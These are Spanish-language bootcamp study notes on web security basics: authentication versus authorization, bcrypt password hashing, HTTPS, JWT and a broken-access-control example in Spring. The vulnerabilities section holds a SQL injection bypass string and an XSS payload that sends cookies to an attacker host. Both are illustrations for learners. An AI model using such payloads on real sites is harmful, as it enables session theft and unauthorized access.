# Seguridad-en-Desarrollo-Web
---

## 1. Conceptos Base

| Concepto | Definición simple | Nivel técnico breve | Ejemplo real |
|---|---|---|---|
| **Permissions** | Define qué puede hacer cada usuario dentro de un sistema. | Control de acceso a recursos según roles o privilegios asignados. | Un admin puede eliminar usuarios; un user normal no puede. |
| **Password segura** | Contraseña difícil de adivinar que protege una cuenta. | Combinación de caracteres que supera ataques de fuerza bruta o diccionario. | `M1_C0ntr@seña!2025` vs `123456`. |
| **Vulnerabilidad** | Falla o debilidad en un sistema que puede ser explotada. | Defecto en código, configuración o diseño que abre una brecha de seguridad. | Un formulario que acepta código SQL como input. |
| **Intrusión** | Acceso no autorizado a un sistema o sus datos. | Ataque que aprovecha una vulnerabilidad para entrar sin permiso. | Un atacante accede a la base de datos usando SQL Injection. |
| **Seguridad de red** | Protección de los datos que viajan entre cliente y servidor. | Conjunto de protocolos y herramientas que protegen la infraestructura de red. | Usar HTTPS en lugar de HTTP para cifrar el tráfico. |

---

## 2. 🔑 Permissions (Accesos en Sistemas)

### ¿Qué es Autenticación?
Es el proceso de **verificar quién eres**. El sistema comprueba tu identidad antes de dejarte entrar.

### ¿Qué es Autorización?
Es el proceso de **verificar qué puedes hacer**. Después de entrar, el sistema decide a qué recursos tienes acceso.

### ¿Cuál es la diferencia?

| | Autenticación | Autorización |
|---|---|---|
| Pregunta | ¿Quién eres? | ¿Qué puedes hacer? |
| Cuándo ocurre | Antes de entrar | Después de entrar |
| Ejemplo | Login con usuario y contraseña | Acceder solo a tus propios datos |

### Ejemplo Developer

- **Login →** Es el punto de autenticación. El usuario envía sus credenciales, el sistema las valida y, si son correctas, le permite el acceso (genera una sesión o token).
- **Roles (admin/user) →** Es autorización. Una vez autenticado, el rol determina qué endpoints o vistas puede usar. Un `admin` puede ver todos los usuarios; un `user` solo ve su perfil.

### Relación con APIs y Sistemas con Usuarios

En una API REST, la autenticación suele manejarse con **JWT o sesiones**. La autorización se implementa con **middlewares** que verifican el rol del usuario antes de ejecutar una ruta:

```java
// Ejemplo conceptual en Java (Spring Security)
@PreAuthorize("hasRole('ADMIN')")
@GetMapping("/users")
public List<User> getAllUsers() { ... }
```

---

## 3. 🔑 A Good Password (Lo Mínimo Obligatorio)

### ¿Qué hace que una contraseña sea segura?

- Mínimo **12 caracteres**
- Combinación de **mayúsculas, minúsculas, números y símbolos** (`@`, `!`, `#`, etc.)
- **No usar datos personales** (nombre, fecha de nacimiento)
- **No reutilizarla** en múltiples servicios
- Idealmente generada con un **password manager**

### ¿Por qué NO guardar contraseñas en texto plano?

Si la base de datos es comprometida, el atacante obtiene **todas las contraseñas directamente**, sin ningún esfuerzo. Es como guardar las llaves de tu casa junto a la puerta.

### ¿Qué es Hashing?

Es una función unidireccional que **transforma la contraseña en una cadena irreversible**. El sistema nunca guarda la contraseña real, solo su hash. Al hacer login, se hashea lo que el usuario escribe y se compara con el hash guardado.


### Ejemplo Developer: ¿Cómo se manejan contraseñas en backend?

```java
// Con Spring Security + BCrypt
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();

// Al registrar usuario:
String hashedPassword = encoder.encode(rawPassword);
user.setPassword(hashedPassword);

// Al hacer login:
boolean matches = encoder.matches(rawPassword, user.getPassword());
```

> ⚠️ **Nunca** uses `MD5` o `SHA1` para contraseñas. Usa `bcrypt`, `argon2` o `scrypt`.

---

## 4. ⚠️ Vulnerabilities (Fallas Reales)

### ¿Qué es una vulnerabilidad?

Es una **debilidad en el código, la configuración o el diseño** de una aplicación que puede ser explotada por un atacante para causar daño o acceder a información que no debería.

### Tipos Comunes

**1. SQL Injection**
El atacante inserta código SQL malicioso en un input para manipular la base de datos.
```sql
-- Input malicioso en un formulario de login:
' OR '1'='1
-- Query resultante:
SELECT * FROM users WHERE email='' OR '1'='1' -- PELIGRO
```

**2. XSS (Cross-Site Scripting)**
El atacante inyecta código JavaScript en la aplicación que se ejecuta en el navegador de otros usuarios.
```html
<!-- Input malicioso en un comentario: -->
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

**3. Exposición de Datos Sensibles**
Contraseñas en texto plano, tokens en el frontend, datos sin cifrar en tránsito o en base de datos.

### ¿Cómo una mala validación rompe una app?

Si un formulario de búsqueda **no valida ni sanitiza** el input del usuario, cualquier dato puede llegar directo a la base de datos o al DOM. Un campo que acepta `<script>alert('hacked')</script>` como nombre de usuario es una vulnerabilidad XSS real.

---

## 5. 🚨 Intrusión (Ataques)

### ¿Qué es una intrusión?

Es cuando un actor no autorizado **logra acceder a un sistema, red o datos** explotando una vulnerabilidad o por falla de seguridad.

### ¿Qué busca un atacante?

- **Datos personales** (emails, contraseñas, tarjetas de crédito)
- **Acceso privilegiado** para tomar control del sistema
- **Información confidencial** para venderla o usarla
- **Recursos del servidor** (criptominería, bots)

### ¿Qué pasa si una app es comprometida?

- Robo masivo de datos de usuarios
- Daño reputacional para la empresa
- Multas legales (GDPR, Ley de Protección de Datos)
- Pérdida de confianza del cliente
- Tiempo de inactividad y costos de recuperación

### Ejemplo

**Robo de datos:** Un atacante usa SQL Injection para extraer toda la tabla `users` con emails y contraseñas hasheadas, luego intenta crackearlas offline.

**Acceso no autorizado:** Un token JWT mal validado permite que un `user` acceda a endpoints de `admin` simplemente modificando el payload del token.

---

## 6. 🌐 Network Security (Seguridad en Red)

### ¿Qué protege la seguridad de red?

Protege los **datos en tránsito** entre cliente y servidor, evita accesos no autorizados a la infraestructura y asegura que los servicios estén disponibles y no sean interceptados.

### ¿Qué es un Firewall?

Es una barrera que **filtra el tráfico de red** según reglas definidas. Permite o bloquea conexiones basándose en IP, puertos o protocolos. Es como el portero de un edificio: decide quién entra y quién no.

### ¿Qué es HTTPS y por qué es importante?

**HTTPS = HTTP + TLS/SSL**. Cifra toda la comunicación entre el cliente y el servidor, garantizando:
- **Confidencialidad:** Nadie puede leer los datos en tránsito
- **Integridad:** Los datos no fueron modificados
- **Autenticidad:** Estás hablando con el servidor correcto

Sin HTTPS, cualquiera en la misma red puede leer tus peticiones con herramientas como Wireshark (ataque **Man-in-the-Middle**).

### Ejemplo Developer: ¿Por qué usar HTTPS en APIs?

Si tu API recibe tokens de autenticación o datos de usuarios por HTTP, esos datos viajan en **texto plano** por la red. Cualquier nodo intermedio (router, ISP, atacante en la misma WiFi) puede interceptarlos. Con HTTPS el tráfico va cifrado de extremo a extremo.

---

## 7. 💻 Conexión Directa con Desarrollo (CLAVE)

### Errores comunes que cometen los developers en seguridad

- Confiar en los datos del usuario sin validar ni sanitizar
- Guardar contraseñas o tokens en texto plano
- Exponer endpoints sin autenticación
- Usar dependencias desactualizadas con vulnerabilidades conocidas
- Dejar credenciales hardcodeadas en el código (y subidas a GitHub 😬)
- No implementar HTTPS en producción

### ¿Qué pasaría si...?

| Situación | Consecuencia |
|---|---|
| **No validas inputs** | SQL Injection, XSS, datos corruptos en BD |
| **No proteges rutas** | Cualquier usuario (o nadie) accede a recursos privados |
| **No usas HTTPS** | Robo de tokens, contraseñas y datos en tránsito |

---





## 8. 🔎 Caso Práctico Real

**Escenario:** *"Un usuario logra acceder a información que no le corresponde."*

### ¿Qué falló?
Falló la **autorización**. El sistema autenticó correctamente al usuario (sabe quién es), pero no verificó si tenía **permiso** para acceder a ese recurso específico.

### ¿Es problema de permisos, vulnerabilidad o intrusión?
- **Problema de permisos** (autorización mal implementada) → causa raíz
- **Vulnerabilidad** → la falta de validación del rol en el endpoint
- **Intrusión** → si fue intencional y el usuario lo explotó deliberadamente

En la práctica, los tres están relacionados: la vulnerabilidad de permisos permite la intrusión.

### ¿Cómo lo evitarías como developer?

1. Verificar siempre el rol/permiso del usuario en **cada endpoint**, no solo en el frontend
2. Implementar control de acceso basado en roles (**RBAC**)
3. Nunca confiar en el ID enviado por el cliente; validar que el recurso pertenece al usuario autenticado
4. Realizar pruebas de autorización como parte del desarrollo

```java
// ❌ MAL: Confiar en el ID que manda el cliente
@GetMapping("/orders/{id}")
public Order getOrder(@PathVariable Long id) {
    return orderRepository.findById(id);
}

// ✅ BIEN: Verificar que la orden pertenece al usuario autenticado
@GetMapping("/orders/{id}")
public Order getOrder(@PathVariable Long id, @AuthenticationPrincipal User user) {
    Order order = orderRepository.findById(id);
    if (!order.getUserId().equals(user.getId())) throw new ForbiddenException();
    return order;
}
```

---

## 9. 🏠 Analogía Obligatoria

| Concepto | Analogía |
|---|---|
| **Permissions** | La llave del edificio abre la puerta principal, pero no todos los departamentos — cada persona tiene acceso solo a su piso. |
| **Password** | La llave de tu casa — si es simple (como `123`), cualquiera puede copiarla fácilmente. |
| **Vulnerabilidad** | Una ventana rota en el edificio — no entró nadie todavía, pero la brecha existe y puede ser aprovechada. |
| **Intrusión** | El ladrón que encontró la ventana rota y entró sin ser invitado. |
| **Seguridad de red** | El sistema de seguridad del edificio completo: cámaras, portero, alarmas, puertas reforzadas — todo lo que protege desde afuera. |

---

## 🧠 BONUS

### ¿Qué es JWT (JSON Web Token)?

Es un **token de autenticación** que el servidor genera al hacer login y envía al cliente. Contiene información codificada (payload) sobre el usuario y sus permisos, firmada digitalmente para garantizar que no fue alterada.


El cliente lo envía en cada petición (`Authorization: Bearer <token>`) y el servidor lo valida sin necesidad de consultar la base de datos en cada request.

### ¿Qué es Autenticación con Tokens?

En lugar de mantener una sesión en el servidor (stateful), el servidor genera un **token firmado** que el cliente guarda (localStorage o cookie segura). Este token contiene la identidad del usuario y el servidor solo necesita verificar su firma para autenticar. Es el modelo estándar en **APIs REST y microservicios**.

### ¿Qué es Rate Limiting?

Es una técnica que **limita la cantidad de peticiones** que un usuario o IP puede hacer a una API en un periodo de tiempo. Protege contra:
- **Ataques de fuerza bruta** (intentar miles de contraseñas)
- **DDoS** (saturar el servidor con peticiones)
- **Abuso de API** (scraping masivo)

---

*📚 Notas de estudio — Seguridad Web | Fullstack Java Bootcamp*
